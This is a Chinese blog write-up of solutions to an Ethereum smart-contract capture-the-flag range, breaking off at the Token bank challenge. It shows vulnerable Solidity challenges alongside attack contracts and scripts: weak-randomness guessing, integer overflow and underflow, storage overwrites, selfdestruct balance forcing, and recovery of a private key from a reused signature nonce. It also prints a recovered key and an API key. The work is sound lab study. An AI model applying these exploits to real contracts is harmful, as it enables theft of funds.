记录下这个靶场的刷题。  
前面几个太简单了我们就不写了。  而且这个靶场题版本有点低，可能有些语法和漏洞会和以后遇见的不一样。
# Guess the secret number
**源码：**
```
pragma solidity ^0.4.21;

contract GuessTheSecretNumberChallenge {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    function GuessTheSecretNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }
    
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (keccak256(n) == answerHash) {
            msg.sender.transfer(2 ether);
        }
    }
}
```
*要求：猜出哈希加密的数.*  
## 分析：
看见这个题呢，我脑海里第一个想法就是for循环去暴力破解。但是我又想是不是工作量太大了，直到我看见了n的范围是uint8，也就是2的八次方一共256个数。不犹豫了就暴力破解吧！！

## 攻击合约：
```

contract attak{
    uint8 public n;
  
      bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;
    function att()public {
        for (uint8 i =0;i<256;i++){
            if(keccak256(i)==answerHash){
                n=i;
                break;
            }
        }
      
    }
 
}

```
通过这个合约算出n

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/44a141e5acb64992a4d9dc83d0af0748~tplv-k3u1fbpfcp-watermark.image?)  
再调用guess方法就可以了

# Guess the secret number

**源码：**
```
pragma solidity ^0.4.21;

contract GuessTheRandomNumberChallenge {
    uint8 answer;

    function GuessTheRandomNumberChallenge() public payable {
        require(msg.value == 1 ether);
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```
*要求：猜出随机数*  
## 分析：

这个题第一眼很简单，他是根据block.number来生成随机数的，我们只要能和他在同一区块且用同样生成方法就可以生成answer.
然而，并不是这样的。因为。。。他有一个now!!他的answer在他部署的那一刻就生成好了。

转变思路，answer变量虽然在合约层面看不见，但是我们却可以在区块链上看见，我们可以在控制台直接查看到它的值。

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/069129ab836c479dac47dca103906b51~tplv-k3u1fbpfcp-watermark.image?)

将e换算成十进制就是14，调用guess方法成功

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bd061dd6b2604a8595de6fa6fcdea137~tplv-k3u1fbpfcp-watermark.image?)

# Guess the new number
**源码：**
```
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

```
## 分析：
看见这个题我悟了，这才是上一个想的方法。因为他是实时生成answer的我们就可以和他生成同一个数。

## 攻击合约
```

contract attack{
   GuessTheNewNumberChallenge th;
   function att(address t)public payable{
    th=GuessTheNewNumberChallenge(t);
     uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
     th.guess.value(0.001 ether)(answer);

   }
   function()external payable {

   }
}
```

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/889f134130814321a0c9923e4d876dd1~tplv-k3u1fbpfcp-watermark.image?)
# Predict the future
**源码：**
```
pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```
## 分析：
这个题要我们先预测数，并且要至少两个区块之后才能验证是否正确。每次猜完guesser就会归0，所以只能猜一次。我们看见answer最后%10，也就是说答案只有10个数字，0-9

所以暴力破解，选一个数，当这个满足条件时，我们就去调用settle方法。

## 攻击合约
```
contract attack{
    PredictTheFutureChallenge pr;
   function attack(address addr)payable{
       pr=PredictTheFutureChallenge(addr);
       pr.lockInGuess.value(0.001 ether)(5);
    }
    function att(address addr)public payable{
     
       uint8 n =5;
       uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        if (n==answer){
            pr.settle();
        
        }else{
            return;
        }
       
    }
    function()external payable{

    }
}
```
# Predict the block hash
**源码：**
```
pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```
### 分析：
这个题我按照以往的思路attack,发现不行。去查了下攻略，发现问题出在`block.blockhash`上。  
来自官网的说明：

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4e430f4219c54104b2056dccf38ea9f8~tplv-k3u1fbpfcp-watermark.image?)

也就是说只有最新的256个区块才会返回hash，其他的都返回0.那么就好办了，我们直接输入`*0x0000000000000000000000000000000000000000000000000000000000000000*`再等到他过了256个区块后就破解啦


# Token sale
**源码：**
```
pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}
```
## 分析：
这个题问题出在buy方法上，可能存在上溢。因为虽然合约里eth的单位是ether，但是他的存储还是以wei为单位。1 ether=10^18.如果我们传入一个较大的numTokens，产生溢出得到一个很小的value。

计算产生溢出的最小值
> `numTokens=2**256//10**18 +1`  
> `value=numTokens*10**18%2**256`

在solidity中可以这样计算：
```
contract figure{
    uint256 public max2;
    uint256 public max10;
    uint256 public numToken；
    uint256 public value;
    function fi()public {
        max2=2**256-1;
        max10=10**18;

    }
    function f2()public{
        numToken=max2/max10 +1/max10+1;
        value=numToken*10**18;
    }
}
```

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c345e7b3a4bf43cdb4a54ee440a4269d~tplv-k3u1fbpfcp-watermark.image?)

结果：numToken:115792089237316195423570985008687907853269984665640564039458   
value:415992086870360064

## 攻击：

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a35b3766dc884eacb28af4456aae5a24~tplv-k3u1fbpfcp-watermark.image?)


![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4d021aa8a5354aceb4779e4f694d0382~tplv-k3u1fbpfcp-watermark.image?)

## Token whale
 ```
 pragma solidity ^0.4.21;

contract TokenWhaleChallenge {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleChallenge(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}
```
## 分析：
这个题，我一看代码就一直在想溢出，但是却没找到切入点，然后这个题的问题呢，是transferFrom的逻辑错误。  
`transferFrom`前面一系列检查都是检查的from，然而转账的时候却是转的msg.sender。也就是说我只要value满足from，但是不满足msg.sender，就可以使` balanceOf[msg.sender] -= value;`下溢。

## 攻击过程：
根据题目条件，初始我有1000；
我先给B转600

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b53d45c10992406ab6d108d866138b4f~tplv-k3u1fbpfcp-watermark.image?)

然后让B给我授权600

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/14454d473dcc473abdee66d30e8f948d~tplv-k3u1fbpfcp-watermark.image?)

我执行transferFrom。（注意：因为此时value=600,msg.sender(我）只有400，所以会发生下溢）

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b6d6655ab133491b8a0b0bbb7b0dc5e5~tplv-k3u1fbpfcp-watermark.image?)

成功！

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7bc130bb5fab4616a27a42be3dbe2516~tplv-k3u1fbpfcp-watermark.image?)

# Retirement fund
**源码：**
```
pragma solidity ^0.4.21;

contract RetirementFundChallenge {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = now + 10 years;

    function RetirementFundChallenge(address player) public payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (now < expiration) {
            // early withdrawal incurs a 10% penalty
            msg.sender.transfer(address(this).balance * 9 / 10);
        } else {
            msg.sender.transfer(address(this).balance);
        }
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary);

        uint256 withdrawn = startBalance - address(this).balance;

        // an early withdrawal occurred
        require(withdrawn > 0);

        // penalty is what's left
        msg.sender.transfer(address(this).balance);
    }
}
```
## 分析：
乍一看没有任何问题，然后我们去看一切可能改变的地方。withdrawn只要合约地址大于startBalance（1 ether)就能下溢。那么，怎么增加合约余额呢？又没有payable函数又没有receive、fallback。

当当当，solidty可以通过自毁将合约余额发送到另一个地址。`selfdestruct函数`

所以，写个自爆合约吧

## 攻击合约
```
contract destruct{
    function kill()public payable{
        selfdestruct(0xaE036c65C649172b43ef7156b009c6221B596B8b);
    }
}
```
成功！  
![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f86019d9e83f4deea89cd8972614f52b~tplv-k3u1fbpfcp-watermark.image?)
# Mapping

**源码：**
```
pragma solidity ^0.4.21;

contract MappingChallenge {
    bool public isComplete;
    uint256[] map;

    function set(uint256 key, uint256 value) public {
        // Expand dynamic array as needed
        if (map.length <= key) {
            map.length = key + 1;
        }

        map[key] = value;
    }

    function get(uint256 key) public view returns (uint256) {
        return map[key];
    }
}
```
## 分析：
我们发现`isComplete`在合约中并没有可以修改的地方，聚焦到动态数组。  
从题目而言，slot[0]存储的是isComplete，slot[1]存储的是map动态数组。  

但是动态数组的存储方式是：slot【1】存储数组的长度，数组的data存储在：keccak256(bytes(1))+x，x就是数组的下标。  
但是solidty一共有2^256个插槽，也就是说动态数组的存储范围覆盖了整个插槽范围，也就是说我们可以找到数组data起始位置推出slot[0]的位置，然后修改slot[0]数据。

计算数组data起始位：
```
contract attack{
    bytes32 public out; 
    uint256 public res;
      function att()public {
     out=keccak256(bytes32(1));
     res =2**256-1-uint256(out)+1;
  }
}
```
res就是我们算出来的slot[0]的位置，带入set方法，在solidity中0为false，ture为1，value输入1

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/aa7bea79aacc4595874566efcb2c5c8b~tplv-k3u1fbpfcp-watermark.image?)

## 攻击过程：

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e29dd3856437419081a51d0785cf4eef~tplv-k3u1fbpfcp-watermark.image?)

# Donation
**源码：**
```
pragma solidity ^0.4.21;

contract DonationChallenge {
    struct Donation {
        uint256 timestamp;
        uint256 etherAmount;
    }
    Donation[] public donations;

    address public owner;

    function DonationChallenge() public payable {
        require(msg.value == 1 ether);
        
        owner = msg.sender;
    }
    
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function donate(uint256 etherAmount) public payable {
        // amount is in ether, but msg.value is in wei
        uint256 scale = 10**18 * 1 ether;
        require(msg.value == etherAmount / scale);

        Donation donation;
        donation.timestamp = now;
        donation.etherAmount = etherAmount;

        donations.push(donation);
    }

    function withdraw() public {
        require(msg.sender == owner);
        
        msg.sender.transfer(address(this).balance);
    }
}
```
## 分析：
这个题我没有什么思路，然后去看了下大佬们的博客。问题是在于结构体的声明并没有初始化，就没有赋予存储空间，所以slot[0]是`Donation【】`，slot[1]是owner。

然后为结构体在函数内非显式地初始化的时候会使用storage存储而不是memory，所以就可以达到变量覆盖的效果，显然此处donate函数中初始化donation结构体的过程存在问题，我们可以覆盖solt 0和slot 1处1存储的状态变量

## 攻击过程：

计算下数据：
```
contract jisuan{
   uint256 public res;
   uint256 public addr;
   function att()public{
       addr=uint256(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2);
       res=addr/(10**36);
   }
}
```

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b05287a8999342a6858b9bf4e67e53d7~tplv-k3u1fbpfcp-watermark.image?)

res就是输入的value,addr就是etherAmount。（注意：有个坑，scale后面有个ether!!)

**成功！**

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b82c486ed72841e8a4b91c335cb2424c~tplv-k3u1fbpfcp-watermark.image?)

# Fifty years
```
pragma solidity ^0.4.21;

contract FiftyYearsChallenge {
    struct Contribution {
        uint256 amount;
        uint256 unlockTimestamp;
    }
    Contribution[] queue;
    uint256 head;

    address owner;
    function FiftyYearsChallenge(address player) public payable {
        require(msg.value == 1 ether);

        owner = player;
        queue.push(Contribution(msg.value, now + 50 years));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function upsert(uint256 index, uint256 timestamp) public payable {
        require(msg.sender == owner);

        if (index >= head && index < queue.length) {
            // Update existing contribution amount without updating timestamp.
            Contribution storage contribution = queue[index];
            contribution.amount += msg.value;
        } else {
            // Append a new contribution. Require that each contribution unlock
            // at least 1 day after the previous one.
            require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);

            contribution.amount = msg.value;
            contribution.unlockTimestamp = timestamp;
            queue.push(contribution);
        }
    }

    function withdraw(uint256 index) public {
        require(msg.sender == owner);
        require(now >= queue[index].unlockTimestamp);

        // Withdraw this and any earlier contributions.
        uint256 total = 0;
        for (uint256 i = head; i <= index; i++) {
            total += queue[i].amount;

            // Reclaim storage.
            delete queue[i];
        }

        // Move the head of the queue forward so we don't have to loop over
        // already-withdrawn contributions.
        head = index + 1;

        msg.sender.transfer(total);
    }
}
```
## 分析：
这个题难度很大，用了溢出、结构体覆盖等知识点，过程有些繁琐需要花时间理解。
### upsert函数
当index小于数组长度时，就会覆盖原来的Contribution。
当index大于数组长度时，就会有新的Contribution，`amount`会覆盖queue的length，`unlockTimestamp`会覆盖head。    

新解锁日期的要求是大于最后一个块的解锁日期的一天,1days也就是`24*3600`，也就是说可以产生上溢。如果我们新加一个块，且`timestamp=2^256-24*3600`那么我们的下一个块就会产生上溢，产生新块的时间就可以直接变成0.head也变成0了。

head为0就可以通过withdraw方法将所有块的钱取出来了。

因为value的值是会覆盖queue的长度的，因此如果我们value=0的话，就会覆盖掉原来的块（认为oldlength为0，然后push新的这个块，从而覆盖掉原本的块了），那么1 eth就会不翼而飞。所以我们的value至少是1 wei, 但是输入1wei amount会是2 wei.因为push操作会将数组length+1，amount自然也加1了。

画个图：

![97ABE1C6399999154ACEC6604773B3AF.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3469956ad3544264b31c928780c49ae9~tplv-k3u1fbpfcp-watermark.image?)

但是现在total是1 eth 5 wei,而合约里只有1 eth 3wei,transfer就会失败。这2wei可以通过自爆合约传入。

第二种：在第二次调用的时候value还是等于1 wei，这样就会覆盖掉第二个块，并且正好合约余额与total相等



![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d0a1dc49a6c942e197eaff3a0e4a3a25~tplv-k3u1fbpfcp-watermark.image?)

# Fuzzy identity
**源码：**
```
pragma solidity ^0.4.21;

interface IName {
    function name() external view returns (bytes32);
}

contract FuzzyIdentityChallenge {
    bool public isComplete;

    function authenticate() public {
        require(isSmarx(msg.sender));
        require(isBadCode(msg.sender));

        isComplete = true;
    }

    function isSmarx(address addr) internal view returns (bool) {
        return IName(addr).name() == bytes32("smarx");
    }

    function isBadCode(address _addr) internal pure returns (bool) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"000000000000000000000000000000000badc0de";
        bytes20 mask = hex"000000000000000000000000000000000fffffff";

        for (uint256 i = 0; i < 34; i++) {
            if (addr & mask == id) {
                return true;
            }
            mask <<= 4;
            id <<= 4;
        }

        return false;
    }
}
```
## 分析：
题目isComplete返回true的要求是两个方法都返回true。  
（1）`isSmarx`方法要返回true，需要重写name方法
（2）`isBadCode`方法返回ture，需要我们构造一个含有badc0de字母的地址。【这里有一个知识点：create2】

## 攻击过程：
**攻击合约：**
```
contract attack{
    function att()public {
     FuzzyIdentityChallenge fuzzy=FuzzyIdentityChallenge(0x9C9fF5DE0968dF850905E74bAA6a17FED1Ba042a);
     fuzzy.authenticate();
    }
    function name() external view returns (bytes32){
        bytes32 a ="true";
        return a;
    }

}
```
pathon的一个构造salt的脚本：
```
from web3 import Web3
//deploy的地址
s1 = '0xfff68777A4bB36a06BC5c03c6ddDb3Dd3f482Ba5a6'
//攻击合约字节码的哈希
s3 = '6fd122b1ed268149c197d543cdee1f6c93b9322d845ed7340fc47a60a6005563'

i = 0
while(1):
    salt = hex(i)[2:].rjust(64, '0')
    s = s1+salt+s3
    hashed = Web3.sha3(hexstr=s)
    hashed_str = ''.join(['%02x' % b for b in hashed])
    if '5a54' in hashed_str[26:]:
        print(salt,hashed_str)
        break
    i += 1
    print(salt)
```
*注意：s1必须加上0xff在前面*


  地址构造合约
  ```
  contract deploy{
    bytes contractBytecode = hex"608060405273d9145cce52d386f254917e481eb44e9943f391386000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a3442ead6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100cd57600080fd5b505af11580156100e1573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166380e10aa56040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561014d57600080fd5b505af1158015610161573d6000803e3d6000fd5b50505050603f806101736000396000f3fe6080604052600080fdfea2646970667358221220bfcb85a73a39f9957b30cdcc5b00a0fc63282eced0ef1f94f169ae3b283a2dea64736f6c634300060c0033"

     function deploy(bytes32 salt) public {
    bytes memory bytecode = contractBytecode;
    address addr;
      
    assembly {
      addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
    }
  }
    function getHash()public view returns(bytes32){
      return keccak256(contractBytecode);
  }
}
}
```
将salt输入进构造合约，攻击合约将被自动部署。

将生成的地址后20位拿来部署attack到本地，进行攻击

*思路就是这样，salt生成太久了，然后好不容易生成出来我一去执行又卡死了，实在是不想重来了*

# Public Key
**源码：**
```
pragma solidity ^0.4.21;

contract PublicKeyChallenge {
    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;
    bool public isComplete;

    function authenticate(bytes publicKey) public {
        require(address(keccak256(publicKey)) == owner);

        isComplete = true;
    }
}
```
## 分析：
这个题要我们根据地址找公钥，直接反推是不行的 。查了资料，有消息+签名是可以恢复出公钥的。知识涉及到以太坊上公钥的生成和交易的签名。

[(26条消息) [以太坊源代码分析] IV. 椭圆曲线密码学和以太坊中的椭圆曲线数字签名算法应用_teaspring的博客-CSDN博客](https://blog.csdn.net/teaspring/article/details/77834360)

在对交易进行签名后，我们只要知道r、s、v和hash就可以计算出公钥，然而这些值都可以在交易内进行读取。所以我们来看看该地址进行过的交易。

由于我写这个题的时候，ropsten测试链已经关了。不能查到owner地址进行过的交易信息，所以我只好借鉴下别人之前查的数据。

![image.png](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ee0f30caa701408baa308393b2294ff6~tplv-k3u1fbpfcp-watermark.image?)

有一个out交易可以查询
> await web3.eth.getTransaction("0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb")

交易信息：
```
blockHash: "0x487183cd9eed0970dab843c9ebd577e6af3e1eb7c9809d240c8735eab7cb43de"  
blockNumber: 3015083  
from: "0x92b28647Ae1F3264661f72fb2eB9625A89D88A31"  
gas: 90000  
gasPrice: "1000000000"  
hash: "0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb"  
input: "0x5468616e6b732c206d616e21"  
nonce: 0  
r: "0xa5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7"  
s: "0x5710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962"  
to: "0x6B477781b0e68031109f21887e6B5afEAaEB002b"  
transactionIndex: 7  
type: 0  
v: "0x29"  
value: "0"
```
利用这些已知的交易信息来使用[ethereumjs-tx](https://github.com/ethereumjs/ethereumjs-tx)库创建一个交易从而利用里面封装的getSenderAddress得到公钥,脚本：
```
const EthereumTx = require('ethereumjs-tx').Transaction;  
const util = require('ethereumjs-util');  
  
var rawTx = {  
  nonce: '0x00',  
  gasPrice: '0x3b9aca00',  
  gasLimit: '0x15f90',  
  to: '0x6B477781b0e68031109f21887e6B5afEAaEB002b',  
  value: '0x00',  
  data: '0x5468616e6b732c206d616e21',  
  v: '0x29',  
  r: '0xa5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7',  
  s: '0x5710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962'  
};  
  
var tx = new EthereumTx(rawTx,{ chain: 'ropsten'});  
  
pubkey=tx.getSenderPublicKey();  
pubkeys=pubkey.toString('hex');  
var address = util.keccak256(pubkey).toString('hex').slice(24);  
  
console.log(pubkeys);  
console.log(address);
```
结果：

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/134a56890bc14b0fa71570909ea45ad4~tplv-k3u1fbpfcp-watermark.image?)

成功！

![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/138826e5b0a344c88a3303060e9b51ab~tplv-k3u1fbpfcp-watermark.image?)

# Account Takeover
**源码：**
```
pragma solidity ^0.4.21;

contract AccountTakeoverChallenge {
    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;
    bool public isComplete;

    function authenticate() public {
        require(msg.sender == owner);

        isComplete = true;
    }
}
```
## 分析：
这个题要我们推出私钥，这两道题难度都挺大的。先去查看该地址进行过的交易数据，发现交易很多。（因为不停有人破解他的私钥然后解题，浏览器上数据太多，我们查不到最初的几笔交易）

![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8009f6370eda426faea2b0650d873a79~tplv-k3u1fbpfcp-watermark.image?)

于是这里用了一下api  
> https://api-ropsten.etherscan.io/api?module=account&action=txlist&address=0x6B477781b0e68031109f21887e6B5afEAaEB002b&startblock=0&endblock=99999999&page=1&offset=10&sort=asc&apikey=NBV1N4K1Z1JIIN766SEZ78P619FK43ZA74


![image.png](https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d604fae0e0b34cc4ad69424cae69d573~tplv-k3u1fbpfcp-watermark.image?)

去查一下他的第一个交易和第二个交易,解析出来可以发现他们签名的 r 值是相同的  
**原理：**  
在 secp256k1 中有：

![notion image](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cff1f38fff9a4c3ab24e3622943d32da~tplv-k3u1fbpfcp-zoom-1.image)

其中（r, s) 是签名，G 是椭圆曲线上的基点，k 是随机数，M 是消息，H(M) 表示对 M 进行 sha256，k-1 表示的是 k 的[模反元素](https://zh.wikipedia.org/wiki/%E6%A8%A1%E5%8F%8D%E5%85%83%E7%B4%A0)。可以看出，相同的 r 代表着相同的 k。 从 (1)(2)(3) 可以推得：

![notion image](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e89c3c991eac4a0bbfa30d453604045b~tplv-k3u1fbpfcp-zoom-1.image)

所以在 k 暴露的情况下，私钥是可以被计算出来的。接下来的任务就是尝试得到 k：

![notion image](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1c75f7c9995f4926888cfb3bf178b377~tplv-k3u1fbpfcp-zoom-1.image)

所以有：

![notion image](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/7dab712c8b454a75825c99f44b9bd096~tplv-k3u1fbpfcp-zoom-1.image)

结合 (4)(6) 就可以计算出私钥。

首先用生成消息的hash
```
const EthereumTx = require('ethereumjs-tx').Transaction;  
var rawTx1 =  
    { nonce: 0,  
     gasPrice: '0x3b9aca00',  
     gasLimit: '0x5208',  
     to: '0x92b28647ae1f3264661f72fb2eb9625a89d88a31',  
     value: '0x1111d67bb1bb0000',  
     data: '0x',  
     v: 41,  
     r: '0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166',  
     s: '0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8'  
}  
var rawTx2 =  
    { nonce: 1,  
     gasPrice: '0x3b9aca00',  
     gasLimit: '0x5208',  
     to: '0x92b28647ae1f3264661f72fb2eb9625a89d88a31',  
     value: '0x1922e95bca330e00',  
     data: '0x',  
     v: 41,  
     r: '0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166',  
     s: '0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de'  
}  
tx1 = new EthereumTx(rawTx1,{ chain: 'ropsten'});  
  
tx2 = new EthereumTx(rawTx2,{ chain: 'ropsten'});  
  
z1=tx1.hash(false).toString("hex");  
z2=tx2.hash(false).toString("hex");  
console.log(z1);  
console.log(z2);
```
然后根据算法进行一个私钥的计算
```
from Crypto.Util.number import *  
  
  
def derivate_privkey(p, r, s1, s2, z1, z2):  
    z = z1 - z2  
    s = s1 - s2  
    r_inv = inverse(r, p)  
    s_inv = inverse(s, p)  
    k = (z * s_inv) % p  
    d = (r_inv * (s1 * k - z1)) % p  
    return d, k  
  
z1 = 0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c  
s1 = 0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de  
r = 0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166  
z2 = 0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04  
s2 = 0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8  
  
p  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141   
  
print("privatekey:%xn k:%x" % derivate_privkey(p,r,s1,s2,z1,z2))
```
获得私钥 614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269
# Assume ownership
**源码：**
```
pragma solidity ^0.4.21;

contract AssumeOwnershipChallenge {
    address owner;
    bool public isComplete;

    function AssumeOwmershipChallenge() public {
        owner = msg.sender;
    }

    function authenticate() public {
        require(msg.sender == owner);

        isComplete = true;
    }
}
```
## 分析：
这个题给我整笑了，因为0.4.x版本他的构造函数就是和他合约同名的函数，然后我们仔细看他的函数`AssumeOwmershipChallenge`owner打成了owmer.就说离谱不离谱。。。所以你直接就可以执行该函数然后更换owner.

**成功**

![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/88155fc640ff4eb7af769fe53e72cb2e~tplv-k3u1fbpfcp-watermark.image?)

# Token bank
**源码：**
```
pragma solidity ^0.4.21;

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes data) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping (address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

